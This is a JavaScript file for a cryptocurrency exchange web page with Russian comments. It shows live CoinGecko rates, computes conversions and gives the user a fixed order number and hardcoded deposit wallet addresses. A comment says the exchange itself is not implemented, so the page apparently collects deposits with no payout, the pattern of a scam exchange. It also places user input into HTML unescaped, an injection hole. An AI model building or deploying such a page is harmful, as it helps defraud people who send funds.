let exchangeRates = {};

// Функция для загрузки курсов валют
async function loadRates() {
    const ratesContainer = document.getElementById('ratesContainer');

    // Запрос к CoinGecko API для получения курсов валют
    const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=matic-network,tether,bitcoin,ethereum,litecoin,ripple,solana,tezos&vs_currencies=usd');
    const data = await response.json();

    // Сохранение курсов валют
    exchangeRates = {
        matic: data['matic-network'].usd,
        usdt: data.tether.usd,
        btc: data.bitcoin.usd,
        eth: data.ethereum.usd,
        ltc: data.litecoin.usd,
        xrp: data.ripple.usd,
        sol: data.solana.usd,
        xtz: data.tezos.usd
    };

    // Обновление HTML содержимого с текущими курсами валют
    ratesContainer.innerHTML = `
        <p>1 MATIC = ${exchangeRates.matic} USD</p>
        <p>1 USDT (TRC20) = ${exchangeRates.usdt} USD</p>
        <p>1 ETH = ${exchangeRates.eth} USD</p>
        <p>1 LTC = ${exchangeRates.ltc} USD</p>
        <p>1 XRP = ${exchangeRates.xrp} USD</p>
        <p>1 SOL = ${exchangeRates.sol} USD</p>
        <p>1 XTZ = ${exchangeRates.xtz} USD</p>
        <p>1 BTC = ${exchangeRates.btc} USD</p>
    `;
}

// Обновление результата обмена
function updateResult() {
    const fromCurrency = document.getElementById('fromCurrency').value;
    const toCurrency = document.getElementById('toCurrency').value;
    const amount = document.getElementById('amount').value;

    if (amount && exchangeRates[fromCurrency] && exchangeRates[toCurrency]) {
        const result = (amount * exchangeRates[fromCurrency] / exchangeRates[toCurrency]).toFixed(6);
        document.getElementById('result').value = `${result} ${toCurrency.toUpperCase()}`;
    } else {
        document.getElementById('result').value = '';
    }
}

// Обработчик ввода суммы
document.getElementById('amount').addEventListener('input', updateResult);
// Обработчики изменения валюты
document.getElementById('fromCurrency').addEventListener('change', updateResult);
document.getElementById('toCurrency').addEventListener('change', updateResult);

// Функция для отображения таймера
function startTimer(duration, display) {
    let timer = duration, minutes, seconds;
    const interval = setInterval(function () {
        minutes = parseInt(timer / 60, 10);
        seconds = parseInt(timer % 60, 10);

        minutes = minutes < 10 ? "0" + minutes : minutes;
        seconds = seconds < 10 ? "0" + seconds : seconds;

        display.textContent = minutes + ":" + seconds;

        if (--timer < 0) {
            clearInterval(interval);
            alert("Time is up! Please try the transaction again.");
        }
    }, 1000);
}

// Генерация номера заказа
function generateOrderNumber() {
    return 'E536635'; 
}

function getWalletAddress(currency) {
    switch (currency) {
        case 'matic':
            return '0x00FE166963595f0ede196dd170c5d4d6B9774016'; 
        case 'usdt':
            return 'TAkYUGzrbxkhzPJJSpTwWXnXch1vJTnAWW'; 
        case 'eth':
            return '0x00FE166963595f0ede196dd170c5d4d6B9774016'; 
        case 'ltc':
            return 'ltc1q4u066qn7hn73q78daxl4kkds8282qskqp0s7w5';
        case 'xrp':
            return 'rJNHytozzw3Mhsf781jNjuY3BxP8cwUsQi';
        case 'sol':
            return 'EfFVbo8hxHhrfTFMr9SrbycLA1Sbrd8TnhYyXtr3knjf';
        case 'xtz':
            return 'tz1M1DEuQu9VhERJZebvyc76u3mZBHqKr5Tn';
        case 'btc':
            return 'bc1qt52q6p0t97snv4qpl3w2t4zndhxulrfumgqgxk';    
        default:
            return '';
    }
}

function closePopupOutside(event) {
    const popup = document.querySelector('.popup');
    if (popup && !popup.contains(event.target)) {
        popup.remove();
        document.removeEventListener('click', closePopupOutside);
    }
}

// Обработчик отправки формы обмена валют
document.getElementById('exchangeForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Предотвращаем перезагрузку страницы
    const fromCurrency = document.getElementById('fromCurrency').value;
    const toCurrency = document.getElementById('toCurrency').value;
    const amount = document.getElementById('amount').value;
    const wallet = document.getElementById('wallet').value;
    const email = document.getElementById('email').value;

    

    // Логика обмена валют (не реализована)
    const orderNumber = generateOrderNumber();
    const popupContent = `
        <div class="popup">
            <h2>Order #${orderNumber}</h2>
            <form id="paymentForm">
                <label for="paymentWallet">Crypto Wallet:</label>
                <input type="text" id="paymentWallet" value="${getWalletAddress(fromCurrency)}" readonly>
                <label for="paymentAmount">Payment Amount:</label>
                <input type="text" id="paymentAmount" value="${amount} ${fromCurrency.toUpperCase()}" readonly>
                <label for="resultAmount">You will receive:</label>
                <input type="text" id="resultAmount" value="${document.getElementById('result').value}" readonly>
                <label for="paymentEmail">Email:</label>
                <input type="email" id="paymentEmail" value="${email}" readonly>
            </form>
        </div>
    `;

    // Вставляем всплывающее окно в DOM
    document.body.insertAdjacentHTML('beforeend', popupContent);

    // Делаем всплывающее окно видимым
    setTimeout(() => {
        document.querySelector('.popup').style.display = 'block';
    }, 1000); // Устанавливаем задержку в 1 секунду

    // Закрытие всплывающего окна при клике вне его области
    document.addEventListener('click', closePopupOutside);
});

document.addEventListener('DOMContentLoaded', function () {
    loadRates();
    
    // Обновляем фон для каждого выпадающего списка
    updateSelectBackground(document.getElementById('fromCurrency'));
    updateSelectBackground(document.getElementById('toCurrency'));
    
    document.getElementById('fromCurrency').addEventListener('change', function () {
        updateSelectBackground(this);
    });

    document.getElementById('toCurrency').addEventListener('change', function () {
        updateSelectBackground(this);
    });

    // Обработчик клика по кнопке Telegram
    document.getElementById('telegramButton').addEventListener('click', function() {
        window.open('https://t.me/exboxsup_bot', '_blank');
    });
});

function updateSelectBackground(selectElement) {
    var selectedOption = selectElement.options[selectElement.selectedIndex];
    var iconUrl = selectedOption.getAttribute('data-icon');
    selectElement.style.backgroundImage = 'url(' + iconUrl + ')';
} 

// Загрузка курсов валют при загрузке страницы
document.addEventListener('DOMContentLoaded', loadRates);
